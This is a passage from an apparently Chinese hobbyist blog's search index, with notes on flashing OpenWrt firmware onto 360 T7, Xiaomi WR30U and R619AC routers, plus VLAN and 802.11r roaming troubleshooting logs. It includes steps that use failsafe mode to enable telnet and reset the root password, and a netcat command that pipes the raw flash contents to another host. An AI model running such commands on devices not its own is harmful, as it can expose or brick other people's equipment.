\u8def\u7531\u667a\u6001 (red-yellow.net) \u5237\u7684\u8fd9\u91cc\u4f5c\u8005\u63d0\u4f9b\u7684immortalwrt\uff1a\u3010\u65b0\u63d0\u9192\u3011\u30102023-6-13\u3011\u7ade\u6597\u4e912.0P&amp;W-R619AC OPENWRT\u56fa\u4ef6|\u63d2\u4ef6\u5168\u9762|\u591a\u7248\u672c-OPENWRT\u4e13\u7248-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>\u4e4b\u524d\u4f7f\u7528switch\u5b98\u65b9\u56fa\u4ef622.03\uff0c\u770b\u5230device\u6709eth0, eth1\uff0c\u7136\u540eswitch\u754c\u9762\u53ef\u4ee5\u8bbe\u7f6e4\u4e2alan\u53e3 \u4f46\u662f\u95ee\u9898\u662f\u53ea\u8981\u4e00\u6539\u52a8vlan\u8bbe\u7f6e\uff0c\u901a\u8fc7wan\u53e3\uff08\u5f00\u542f192.168.99.0\u7684dhcp\uff09\u8bbf\u95eep2w\u5c31\u4f1a\u6389</p> <p>\u540e\u9762\u5237\u4e86\u4e00\u4e2a\u5176\u5b83\u4eba\u7f16\u8bd1\u7684immortalwrt\u56fa\u4ef6\uff0c\u53d1\u73b0\u5176\u5b9e\u53ea\u6709\u4e00\u4e2aeth0\u3002wan\u53e3eth0.2\u662f\u4e00\u4e2avlan\u3002switch\u754c\u9762\u67094\u4e2alan\u548c1\u4e2awan\u53ef\u4ee5\u914d\u7f6e\u3002 \u8fd9\u4e0b\u914d\u7f6eswitch vlan\u5f02\u5e38\u7a33\u5b9a\u987a\u7545 </p> <p>\u8fd9\u91ccCPU\u7aef\u53e3\u7684tag\u548cuntag - \u8bbe\u7f6e\u4e3aoff\uff0c\u5219\u4e0d\u5b58\u5728eth0.3\u8bbe\u5907 - \u8bbe\u7f6e\u4e3atag\u5219eth0.3\u4e0atcpdump\u80fd\u6536\u5230\u5f88\u591a\u5305 - \u8bbe\u7f6e\u4e3auntag\uff0c\u5219\u6536\u4e0d\u5230\u5305</p> <p>\u6536\u5230\u7684\u5305\u5176\u5b9e\u53ea\u6709\u5e7f\u64ad\u7b49\u60c5\u51b5\uff0c\u5426\u5219\u5305\u76f4\u63a5\u4ece\u7279\u5b9a\u7aef\u53e3\u51fa\u53bb\u4e86\uff0c\u4e0d\u4f1a\u5f80\u5176\u5b83\u7aef\u53e3\u53d1\u3002 <pre><code>root@p2w:~# tcpdump -ni eth0.3 host 114.214.236.72\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0.3, link-type EN10MB (Ethernet), capture size 262144 bytes\nq01:50:16.005639 IP 114.214.236.72.45520 &gt; 239.255.255.250.1900: UDP, length 94\n01:50:16.006412 ARP, Request who-has 114.214.236.74 tell 114.214.236.72, length 46\n01:50:16.173072 ARP, Request who-has 114.214.236.96 tell 114.214.236.72, length 46\n01:50:16.926278 ARP, Request who-has 114.214.236.200 tell 114.214.236.72, length 46\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"<p>\u7ecf\u5e38\u6027\u7684\u6389\u7f51\u7edc\uff0c\u7814\u7a76\u540e\u53d1\u73b0\u662fap\u7684br-lan\u548c\u4e0a\u6e38\u65e0\u6cd5\u8fde\u63a5\u4e86\u3002\u901a\u8fc7\u65e0\u7ebf\u624b\u52a8\u8bbe\u7f6e\u9759\u6001ip\u53ef\u4ee5\u8fde\u4e0ap2w\u3002\u5c1d\u8bd5ping \u7f51\u5173\u5730\u5740\uff0c\u53d1\u73b0eth0.1\u4e0a\u80fd\u6293\u5230arp\u5305\uff0c\u4f46\u662f\u4e0a\u6e38\u5bf9\u5e94bridge\u5374\u6293\u4e0d\u5230\u3002\u53cd\u8fc7\u6765\uff0c\u4e0a\u6e38arping ap\u5730\u5740\uff0cap\u4e5f\u6536\u4e0d\u5230\u5305\u3002 - \u6d4b\u8bd5\u5982\u679c\u628a\u8fde\u63a5ap\u7684\u7f51\u7ebf\u8fde\u63a5\u7b14\u8bb0\u672c\uff0c\u7f51\u7edc\u662f\u6b63\u5e38\u7684\uff0c\u56e0\u6b64\u6392\u9664\u4e0a\u6e38\u95ee\u9898\u3002 <pre><code>arping -i interface \u6d4b\u8bd5\u4e8c\u5c42\u662f\u5426\u901a\narp\u67e5\u770b\u5f53\u524dmac\u8868\ntcpdump -ni eth0.1 arp\n</code></pre></p> <p>\u6ca1\u529e\u6cd5\uff0c\u4e0d\u77e5\u5982\u4f55\u89e3\u51b3\uff0c\u53ea\u597d\u91cd\u88c5\u4e86\u5b98\u65b922.03.5\u7684\u7cfb\u7edf\u3002\u5b98\u65b9\u7cfb\u7edf\u628awan\u5355\u72ec\u62ff\u4e86\u51fa\u6765\u4f5c\u4e3aeth1\uff0c\u800cswitch\u754c\u9762\u53ef\u4ee5\u914d\u7f6eeth0\u548c\u5269\u4f59\u56db\u4e2a\u7aef\u53e3</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#360-t7","title":"360 T7","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u57fa\u672c\u53c2\u6570","title":"\u57fa\u672c\u53c2\u6570","text":"<p>mt7681\uff1a2xA53@1.3GHz 256 RAM+ 128 NAND</p> <p>\u4ef7\u683c - \u539f\u7248118x2\u5305\u90ae\uff0c\u9b54\u6539512\u5185\u5b58\u7248\uff1a150</p> <p></p> <p>\u5f85\u673a60\u591a\u5ea6\u6709\u6bd2\uff0c\u770b\u6765\u8fd8\u662f\u9700\u8981\u81ea\u5df1\u52a0\u6563\u70ed\u7247</p> <p>40(30\uff0c\u6700\u5c0f\u8986\u76d6\u4e24\u4e2a\u7684\u8ddd\u79bb) x25\uff08\u6df1\u5ea610mm\uff09 - 13x7 - 12x13 25x25 - 10x12 30x25\uff08\u6df1\u5ea6\uff1a15mm\uff09 - 13x14</p> <p>\u5355\u4e2a\u82af\u7247\uff1a14x14 \u6574\u4e2a\u76d6\u4f4f\uff1a25x25\uff0c30x20</p> <p>hanwckf's blog 360 T7 \u5237 openwrt \u6559\u7a0b\uff5c\u6700\u5f3a\u7684\u767e\u5143\u8def\u7531\u5668 | \u9171\u7d2b\u8868 (qust.me) \u3010\u65b0\u63d0\u9192\u3011360T7 openwrt\u56fa\u4ef6\u53d1\u5e03\uff0c\u611f\u8c22H\u5927-OPENWRT\u4e13\u7248-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn) \u63d0\u5230\u4e86ipv6 + wiregaurd + hnat\u6709\u95ee\u9898\uff1f[\u907f\u5751] 360T7 - V2EX</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u51c6\u5907_1","title":"\u51c6\u5907","text":"<p>\u786c\u4ef6 - \u62c6\u673a\u5de5\u5177\uff1a\u87ba\u4e1d\u5200\uff0c\u64ac\u7247\uff08\u6ca1\u5b83\u771f\u6253\u4e0d\u5f00\uff09 - usb\u8f6cttl\u6a21\u5757\uff0c\u675c\u90a6\u7ebf\u516c\u5bf9\u6bcd</p> <p>\u8f6f\u4ef6 - putty\u7b49\u4e32\u53e3\u8f6f\u4ef6 - \u4fee\u6539\u7248uboot\uff1aRelease 20230727 \u00b7 hanwckf/bl-mt798x (github.com) - \u56fa\u4ef6\uff1a237, immortal\u539f\u7248 - \u53ef\u80fd\u9700\u8981\uff1a\u65e7\u7248\u539f\u5382\u56fa\u4ef6\uff0c\u65b0\u7248\u56fa\u4ef6\u5173\u95ed\u4e86failsafe\u6a21\u5f0fhqvv/360T7: qihoo 360T7 resources and official firmware (github.com) - \u53ef\u9009\uff0cwindows netcat\uff0c\u7528\u4e8e\u5728failsafe\u6a21\u5f0f\u4e0b\u5907\u4efd\u8def\u7531\u5668flash\u3002</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#1-\u62c6\u673a\u548cttl\u6a21\u5757\u8fde\u63a5","title":"1. \u62c6\u673a\u548cTTL\u6a21\u5757\u8fde\u63a5","text":"<p>\u62c6\u673a\u6ce8\u610f\uff1a - \u8def\u7531\u5668\u53ea\u6709\u4e24\u4e2a\u87ba\u4e1d\uff0c\u90fd\u88ab\u80cc\u9762\u8d34\u7eb8\u76d6\u4f4f\u4e86 - \u4e00\u5171\u67092+8\u4e2a\u5361\u53e3\uff0c\u975e\u5e38\u96be\u62c6\u3002\u4f18\u5148\u4ece\u8def\u7531\u5668\u4e0b\u65b9\u64ac\u5f00\uff0c\u7136\u540e\u518d\u4e24\u4fa7\uff0c\u6700\u540e\u4e0a\u4fa7\u6bd4\u8f83\u5bb9\u6613\u3002   - \u89c6\u9891\u53c2\u8003\uff1a360T7\u7b2c\u4e8c\u90e8\u5206\u62c6\u673a_\u54d4\u54e9\u54d4\u54e9_bilibili</p> <p>TTL\u6a21\u5757\u8fde\u63a5 \u677f\u5b50\u5de6\u4e0a\u89d2\u56db\u4e2a\u89e6\u5b54\uff0c\u4ece\u4e0a\u5230\u4e0b\uff1aRX, TX, GND\u3002\u6ce2\u7279\u7387115200 - \u6ce8\u610f\uff0c\u5bf9\u5e94TTL\u6a21\u5757\u4e00\u4fa7\uff0cRX\u9700\u8981\u5bf9\u5e94TX\uff0cTX\u5bf9\u5e94RX</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#2-ttl\u8fdb\u5165failsafe\u6a21\u5f0f\u5f00\u542ftelnet","title":"2. TTL\u8fdb\u5165failsafe\u6a21\u5f0f\u5f00\u542ftelnet","text":"<p>\u539f\u7406 - \u539f\u7cfb\u7edf\u4f7f\u7528uboot\uff0c\u4f46\u662f\u5173\u95ed\u4e86uboot\u83dc\u5355\uff0c\u5f00\u673a\u540e\u4f1a\u76f4\u63a5\u5f15\u5bfc\u5185\u6838 - \u539f\u7cfb\u7edf\u5f15\u5bfc\u8fc7\u7a0b\u4e2d\u652f\u6301failsafe\u6a21\u5f0f\uff0c\u8fdb\u5165\u540e\u53ef\u4ee5mount_root\uff0c\u5bf9\u6587\u4ef6\u7cfb\u7edf\u8fdb\u884c\u4fee\u6539\uff0c\u4ece\u800c\u53ef\u4ee5\u5f00\u542ftelnet</p> <p>\u8fc7\u7a0b - \u8fde\u63a5\u597d\u4e32\u53e3\uff0c\u5e76\u6253\u5f00putty\u540e\uff0c\u63d2\u7535\u5f00\u673a\uff0c\u8def\u7531\u5668\u542f\u52a8\u5e76\u8f93\u51fa\u4fe1\u606f - \u5728\u5f15\u5bfc\u5185\u6838\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u51fa\u73b0\u8fdb\u5165failsafe\u63d0\u793a\uff0c\u6309f+enter\u5373\u53ef\u8fdb\u5165\u3002\u5927\u6982\u67093\u79d2\u7b49\u5f85\u65f6\u95f4\u3002   - \u5982\u679c\u6ca1\u51fa\u73b0\uff0c\u9700\u8981\u964d\u7ea7\u539f\u7cfb\u7edf\u3002\u3010\u65b0\u63d0\u9192\u3011360t7m(t7\u79fb\u52a8\u5b9a\u5236\u7248)\u65e0\u6cd5\u8fdb\u5165failsafe\u6a21\u5f0f-OPENWRT\u4e13\u7248-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn) </p> <p>\u8fdb\u5165\u540e <pre><code># \u5f00\u542fuboot\u63a7\u5236\u53f0\u83dc\u5355\nfw_setenv bootmenu_delay 3\n\n# \u6302\u8f7drootfs\u5e76\u5f00\u542ftelnet\nmount_root\nsed -i 's/.*local debug=.*/\\tlocal debug=1/' /etc/init.d/telnet\n\n# \u4fee\u6539root\u5bc6\u7801\npasswd root\n\n# \u91cd\u542f\nreboot\n</code></pre></p> <p>\u53ef\u4ee5\u9009\u62e9\u5907\u4efd\u56fa\u4ef6 - \u6ce8\u610f\u5343\u4e07\u4e0d\u8981ping\uff0c\u5426\u5219\u65e0\u6cd5ctrl-c - nc\u7ed3\u675f\u540e\u4f1a\u81ea\u52a8\u9000\u51fa\uff0c128MB\u7684flash\u4e0d\u52301\u5206\u949f\u80fd\u591f\u4e0b\u8f7d\u5b8c\u3002 <pre><code># \u5c06\u7535\u8111\u7684IP\u5730\u5740\u8bbe\u7f6e\u4e3a192.168.1.8\uff0c\u63d2\u5165\u8def\u7531\u5668LAN\u53e3\n# \u4f7f\u7528nc\u76d1\u542c3333\u7aef\u53e3\u5e76\u5199\u5165all.bin\n# Windows\u7cfb\u7edf\u53ef\u4ee5\u4f7f\u7528netcat\n# nc -l -p 3333 &gt; all.bin\n\n# \u5728\u8def\u7531\u5668failsafe\u6a21\u5f0f\u4e0b\u5f00\u542f\u7f51\u7edc\nifconfig eth0 0.0.0.0\nbrctl addbr br-lan\nifconfig br-lan 192.168.1.1 netmask 255.255.255.0 up\nbrctl addif br-lan eth0\n\n# \u8bfb\u53d6/dev/mtd0\uff0c\u4f7f\u7528nc\u53d1\u9001\u5230192.168.1.8:3333\ncat /dev/mtd0 | nc 192.168.1.8 3333\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#3-\u5237\u6539\u7248uboot\u5e76\u5237\u56fa\u4ef6","title":"3. \u5237\u6539\u7248uboot\u5e76\u5237\u56fa\u4ef6","text":"<p>\u6539\u7248uboot\u529f\u80fd\u8be6\u7ec6\u4ecb\u7ecd\uff1amt798x uboot \u529f\u80fd\u4ecb\u7ecd (hanwckf.top) - \u5982\u679c\u4f7f\u7528\u539f\u7248uboot\uff0c\u5219\u56fa\u4ef6\u5927\u5c0f\u6700\u591a\u53ea\u80fd\u4f7f\u752836MB\uff0c\u6539\u7248\u652f\u6301108MB - \u652f\u6301webui\u65b9\u4fbf\u5237\u56fa\u4ef6</p> <p>\u6b65\u9aa4 - \u4e0a\u4e00\u6b65\u5f00\u542ftelnet\u540e\uff0c\u6b63\u5e38\u91cd\u542f\u7cfb\u7edf - telnet\u8fde\u63a5\u8def\u7531\u5668\uff0croot\u7528\u6237\u540d\uff0c\u5bc6\u7801\u4e3a\u4e0a\u4e00\u6b65\u4fee\u6539\u7684\u5bc6\u7801 - \u672c\u5730python\u642d\u5efa\u4e00\u4e2ahttp\u670d\u52a1\uff0c\u8def\u7531\u5668\u4e0a\u901a\u8fc7wget\u4e0b\u8f7d\u6539\u7248uboot - \u5237\u5199   <pre><code>mtd write 360t7-fip-fixed-parts.bin fip\n</code></pre> - \u6309\u4f4freset\u952e\uff0c\u63d2\u4e0a\u8def\u7531\u5668\u7535\u6e90\uff0c\u4fdd\u63013\u79d2\u5de6\u53f3\uff0c\u706f\u53d8\u4e3a\u7eff\u8272 - \u8bbe\u7f6e\u9759\u6001ip 192.168.1.2\uff0c\u5373\u53ef\u6253\u5f00\u8def\u7531\u5668web\u754c\u9762\u3002 - \u9009\u62e9\u56fa\u4ef6\u4e0a\u4f20\u5373\u53ef\uff08\u9700\u8981\u5bf9\u5e94\u6539\u7248uboot\u5206\u533a\u683c\u5f0f\u7684\uff09</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u56fa\u4ef6\u9009\u62e9","title":"\u56fa\u4ef6\u9009\u62e9","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#mtwifi\u95ed\u6e90\u9a71\u52a8","title":"mtwifi\u95ed\u6e90\u9a71\u52a8","text":"<p>\u6069\u5c71237\u5927\u4f6c\u56fa\u4ef6 - Hanwckf \u7684\u6e90\u7801+18.06\u8f6f\u4ef6\u5305 - \u652f\u6301802.11 k/v/r\u65e0\u7f1d\u6f2b\u6e38\u3001\u786c\u4ef6 QOS\u7b49\u529f\u80fd - \u901a\u8fc7uboot\u5237\u5165\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u77e5\u4e3a\u4f55\u5237\u5b8c\u91cd\u542f\u540e\u706f\u706d\u4e86\u4e00\u6bb5\u65f6\u95f4\u3002\u521a\u5f00\u59cb\u8fd8\u4ee5\u4e3a\u662f\u8fdb\u4e0d\u4e86\u7cfb\u7edf\uff0c\u4f46\u662f\u540e\u9762\u53d1\u73b0\u6ca1\u95ee\u9898\u7684\u3002 - \u754c\u9762\u4e3b\u9898\u662fdesign\uff0c\u786e\u5b9e\u5f88\u597d\u770b - \u81f4\u547d\u95ee\u9898\uff1a\u7531\u4e8e\u662f\u81ea\u7f16\u8bd1\uff0c\u65e0\u6cd5\u5b89\u88c5wireguard - \u7b2c\u4e8c\u4e2a\u4e25\u91cd\u95ee\u9898\uff1a\u6ca1\u6709\u4f7f\u7528wpad\uff0c\u800c\u662f\u4f7f\u7528luci-app-mtk\u7ba1\u7406\u65e0\u7ebf\uff0c\u8fd9\u5bfc\u81f4\u914d\u7f6eFT\u6ca1\u6cd5</p> <p></p> <p></p> <p>hanwckf/immortalwrt-mt798x (github.com) - immortalwrt-mt798x\u9879\u76ee\u4ecb\u7ecd (hanwckf.top)</p> <p>QWRT(lean) \u3010\u65b0\u63d0\u9192\u3011\u6f58\u591a\u62c9 QWRT MT7981 360T7 R23.5.4 \u9ad8\u6027\u80fd\u95ed\u6e90\u56fa\u4ef6\u53d1\u5e03\uff08\u539f\u751f\u65e0\u7ebf\u914d\u7f6e\uff09-OPENWRT\u4e13\u7248-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn) - lua\u754c\u9762 - \u539f\u7248\u65e0\u7ebf\u914d\u7f6e</p> <p>\u52a0\u7fa4\u540e\uff0c\u7fa4\u4e3b\u544a\u8bc9\u6211\uff0c\u95ed\u6e90\u9a71\u52a8\u53ea\u80fd\u548c\u95ed\u6e90\u9a71\u52a8\u7ec4mesh\uff0c\u5e76\u4e14\u4e5f\u4e0d\u592a\u652f\u6301802.11r\u3002</p> <p>ImmortalwrtARM \u3010\u65b0\u63d0\u9192\u3011\u30102023-08-12\u3011\u5c0f\u7c73WR30U\u95ed\u6e90\u9a71\u52a8immortalwrt\u56fa\u4ef6-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn) - [\u907f\u5751] 360T7 - V2EX\u5728\u8fd9\u91cc\u770b\u5230\u8bf4padavanonly/immortalwrtARM FT\u6b63\u5e38</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u4e0d\u786e\u5b9a","title":"\u4e0d\u786e\u5b9a","text":"<p>\u539f\u7248immortalwrt - \u4f7f\u7528\u4e86\u4e0b\u53d1\u73b0wan\u53e3\u8bbe\u7f6edhcp\u521a\u5f00\u59cb\u603b\u6709\u95ee\u9898\uff0c\u867d\u7136\u6700\u540e\u901a\u8fc7\u624b\u52a8\u91cd\u542fdnsmasq\u65b9\u5f0f\u89e3\u51b3\u4e86\uff0c\u4f46\u662f\u786e\u5b9e\u4e0d\u662f\u5f88\u987a\u5229\u3002</p> <p>\u81ea\u7f16\u8bd1</p> <p>\u5927\u4f6c\u4f60\u597d\u3002\u6211\u8d2d\u4e70\u4e86 360T7 \u548c wr30u \u6765\u5bf9\u5bb6\u4e2d\u7f51\u7edc\u8fdb\u884c\u5347\u7ea7\u3002\u4f46\u662f\u7531\u4e8e\u8fd9\u4e24\u4e2a\u90fd\u6ca1\u6709\u5b98\u65b9 openwrt \u652f\u6301\uff0c\u6211\u7528\u7684\u90fd\u662f\u522b\u4eba\u7f16\u8bd1\u7684\u7248\u672c\u3002 360T7 \u7528\u7684\u662f\u8fd9\u4e2ahanwckf/immortalwrt-mt798x (github.com)\uff0c\u4f46\u662f\u5b83\u7684\u65e0\u9650\u914d\u7f6e\u662f luci-app-mtk \uff0c\u6211\u627e\u4e0d\u5230 802.11r \u7684\u914d\u7f6e\u9009\u9879\u3002 wr30u \u7528\u7684\u662f\u8fd9\u4e2a https://www.right.com.cn/forum/thread-8284824-1-1.html \uff0c\u5b83\u6709 802.11r \u4f46\u662f\u5374\u5565\u90fd\u4e0d\u80fd\u8bbe\u7f6e\uff0c\u6211\u67e5\u770b\u65e5\u5fd7\u770b\u5230 FT \u4f1a\u6709 The PMKID is invalid \u9519\u8bef\u3002\u73b0\u8c61\u5c31\u662f\u8fde\u4e0a\u5b83\u4e4b\u540e\u538b\u6839\u4e0d\u4f1a\u6f2b\u6e38\uff0c\u751a\u81f3\u5f3a\u5ea6\u4f4e\u4e8e-80db \u4e86\u90fd\u4e0d\u4f1a\uff0c\u53ea\u80fd\u624b\u52a8\u65ad\u5f00 wifi \u91cd\u8fde\u3002</p> <p>\u770b\u5230\u4f60\u6d4b\u8bd5\u4e86\u65e0\u7ebf\u5f00\u6e90\u548c\u95ed\u6e90\u7684\u56fa\u4ef6\uff0c\u6211\u60f3\u95ee\u4e0b\u5f00\u6e90\u7684\u56fa\u4ef6\u5728\u90a3\u627e\u3002\u6211\u4e0d\u9700\u8981\u6700\u5f3a\u7684\u6027\u80fd\uff0c\u6211\u53ea\u60f3\u8981\u5b83\u7684\u8bbe\u7f6e\u548c\u5b98\u65b9 openwrt \u4e00\u6837\uff0c\u53ef\u4ee5\u4e00\u8d77\u5de5\u4f5c\u5c31\u884c\u3002\ud83d\ude2d</p> <p>\u6ce8\uff1a\u5bb6\u4e2d\u7f51\u7edc\u539f\u672c\u662f ax6s(\u505a ac \uff09+3 R3g \uff08 ap \uff09\uff0c802.11r \u5de5\u4f5c\u5f97\u5f88\u6b63\u5e38\u3002</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73wr30u","title":"\u5c0f\u7c73WR30U","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u673a","title":"\u5237\u673a","text":"<p>\u4e00\u4e2a\u6bd4\u8f83\u5e7f\u6cdb\u7684\u6559\u7a0b\uff1a\u5c0f\u7c73 WR30U \u89e3\u9501 SSH \u5237 openwrt\uff0c\u6700\u6709\u6027\u4ef7\u6bd4\u7684\u767e\u5143\u8def\u7531\u5668 (qust.me)</p> <p>\u8fd9\u91cc\u7684uboot\u7528\u7684\u662f\u54ea\u4e2a\u4e0d\u6e05\u695a\uff0c\u4e0d\u662f</p> <p>\u6062\u590duboot\uff1a\u3010\u65b0\u63d0\u9192\u3011\u5c0f\u7c73WR30U \u6062\u590d\u539f\u5382\u56fa\u4ef6\u7684\u51e0\u79cd\u65b9\u6cd5-\u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u56fa\u4ef6","title":"\u56fa\u4ef6","text":"<ul> <li>QWRT \u3010\u65b0\u63d0\u9192\u3011\u6f58\u591a\u62c9 QWRT MT7981 \u5c0f\u7c73 WR30U \u8054\u901a\u7248 \u9ad8\u6027\u80fd\u95ed\u6e90\u56fa\u4ef6\u53d1\u5e03\uff08\u539f\u751f\u65e0\u7ebf\u914d\u7f6e\uff09-OPENWRT\u4e13\u7248-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> </ul> <p>X-Wrt, for IoT, a custom Distribution for OpenWrt</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#ft","title":"FT","text":"<p>OpenWRT \u8def\u7531\u5668\u5feb\u901f\u6f2b\u6e38\uff08802.11r\uff09\u914d\u7f6e\u6559\u7a0b\u4ee5\u53ca\u6df1\u5ea6\u89e3\u6790_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com) </p> <pre><code>Thu Aug 17 11:31:19 2023 kern.warn kernel: [164938.908390] 7981@C13L2,MacTableInsertEntry() 1537: New Sta:2a:85:8f:ff:be:e3\nThu Aug 17 11:31:19 2023 kern.err kernel: [164938.915643] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84\nThu Aug 17 11:31:22 2023 kern.notice kernel: [164942.301972] 7981@C08L3,ap_peer_auth_req_at_idle_action() 717: AUTH - MBSS(1), Rcv AUTH seq#1, Alg=2, Status=0 from [wcid=1]2a:85:8f:ff:be:e3\nThu Aug 17 11:31:22 2023 kern.err kernel: [164942.314678] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84\nThu Aug 17 11:31:26 2023 kern.notice kernel: [164945.762095] 7981@C08L3,ap_peer_auth_req_at_idle_action() 717: AUTH - MBSS(1), Rcv AUTH seq#1, Alg=2, Status=0 from [wcid=1]2a:85:8f:ff:be:e3\nThu Aug 17 11:31:26 2023 kern.err kernel: [164945.774793] 7981@C14L1,FT_AuthReqHandler() 536: The MDIE is invalid(Peer MDID= 17 17, My MDID = 82 84\nThu Aug 17 11:31:32 2023 kern.warn kernel: [164952.375145] 7981@C01L2,wifi_sys_disconn_act() 1002:  wdev_idx=1\nThu Aug 17 11:31:32 2023 kern.warn kernel: [164952.381500] 7981@C13L2,MacTableDeleteEntry() 1793: Del Sta:2a:85:8f:ff:be:e3\n</code></pre> <p>\u5ba2\u5385r3g <pre><code>Thu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, OPEN_SYSTEM)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authenticated\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 1)\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 1)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-ASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 1 notification\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: start authentication\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: unauthorizing port\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 1/4 msg of 4-Way Handshake\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (2/4 Pairwise)\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 3/4 msg of 4-Way Handshake\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (4/4 Pairwise)\nThu Aug 17 11:30:05 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 11:30:05 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: authorizing port\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 RADIUS: starting accounting session CDB345D82723F2E1\nThu Aug 17 11:30:05 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: pairwise key handshake completed (RSN)\nThu Aug 17 11:30:05 2023 daemon.notice hostapd: wlan1: EAPOL-4WAY-HS-COMPLETED 2a:85:8f:ff:be:e3\n\nThu Aug 17 11:36:38 2023 daemon.notice hostapd: wlan1: AP-STA-DISCONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 11:36:38 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: disassociated due to inactivity\nThu Aug 17 11:36:38 2023 daemon.debug hostapd: wlan1: STA 